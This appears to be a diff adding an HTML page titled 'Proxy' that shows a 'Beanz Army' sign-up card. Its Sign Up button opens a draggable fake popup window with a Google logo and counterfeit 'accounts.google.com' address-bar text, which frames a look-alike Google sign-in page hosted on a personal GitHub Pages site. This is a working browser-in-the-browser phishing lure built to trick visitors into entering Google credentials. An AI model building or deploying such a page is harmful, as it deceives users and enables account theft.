@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proxy</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            background-image: url('https://tse4.mm.bing.net/th?id=OIP.2wb1SDygUYeqptrxfsTpEQHaEK&pid=Api&P=0&h=220');
+        }
+
+        header img {
+            width: 25px;
+            height: 20px;
+        }
+
+        .wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: min-content;
+            width: min-content;
+            background-color: rgb(214, 214, 214);
+            border-radius: 20px;
+            padding: 20px;
+            position: fixed;
+            cursor: grab;
+            display: none;
+            z-index: 999999999;
+        }
+
+        .wrapper iframe {
+            height: 600px;
+            width: 475px;
+            border-radius: 20px;
+            border: none;
+            margin-top: 30px;
+            border: 2px solid #005eff;
+        }
+
+        .wrapper header {
+            width: 498px;
+            background-color: #f0f0f0;
+            padding: 10px;
+            cursor: grab;
+            user-select: none;
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+        }
+
+        .wrapper header.active {
+            cursor: grabbing;
+        }
+
+        section {
+            background-color: rgba(255, 255, 255, 0.8);
+            width: 500px;
+            height: 300px;
+            border-radius: 25px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            z-index: 1;
+        }
+
+        h1 {
+            color: #005eff;
+            margin-bottom: 50px;
+            font-size: 45px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #005eff;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: #003f8e;
+        }
+
+        p {
+            margin: 5px 0;
+        }
+
+        p:last-child {
+            color: #005eff;
+            cursor: pointer;
+        }
+
+        p:last-child:hover {
+            text-decoration: underline;
+        }
+
+        #closeButton {
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #666666;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-bottom: 10px;
+        }
+
+        #closeButton:hover {
+            background-color: #ee1000;
+        }
+
+        button#closeButton {
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            position: absolute;
+            top: 0px;
+            right: 0px;
+            border-top-right-radius: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+            <img src="https://logos-world.net/wp-content/uploads/2020/09/Google-Symbol.png" alt="Logo :0">
+            https://accounts.google.com/v2/h1IJGdj13nc5/ 
+            <button id="closeButton">&#x0078;</button>
+        </header>
+        <iframe src="https://beanzman69.github.io/GoogleSignIn/" frameborder="0"></iframe>
+    </div>
+    <section>
+        <h1>Beanz Army</h1>
+        <button onclick="GO()">Sign Up</button>
+        <p>Already have an Account?</p>
+        <p style="color: #005eff;">Log In</p>
+    </section>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const wrapper = document.querySelector(".wrapper");
+            const header = wrapper.querySelector("header");
+            let isDragging = false;
+            let initialX, initialY;
+            let offsetX = 0, offsetY = 0;
+
+            function onMouseDown(event) {
+                isDragging = true;
+                header.classList.add("active");
+                initialX = event.clientX - offsetX;
+                initialY = event.clientY - offsetY;
+            }
+
+            function onMouseMove(event) {
+                if (isDragging) {
+                    const newX = event.clientX - initialX;
+                    const newY = event.clientY - initialY;
+                    wrapper.style.left = `${newX}px`;
+                    wrapper.style.top = `${newY}px`;
+                    offsetX = event.clientX - newX;
+                    offsetY = event.clientY - newY;
+                }
+            }
+
+            function onMouseUp() {
+                isDragging = false;
+                header.classList.remove("active");
+            }
+
+            header.addEventListener("mousedown", onMouseDown);
+            document.addEventListener("mousemove", onMouseMove);
+            document.addEventListener("mouseup", onMouseUp);
+        });
+
+        function GO() {
+            const go = document.querySelector(".wrapper");
+            confirm('Allow this page to use sign in with google in a pop up window?')
+            go.style.display = "block";
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            
+            const closeButton = document.getElementById('closeButton');
+            closeButton.addEventListener('click', closeWrapper);
+        });
+
+        function closeWrapper() {
+            const wrapper = document.querySelector('.wrapper');
+            wrapper.style.display = 'none';
+        }
+
+    </script>
+</body>
+</html>
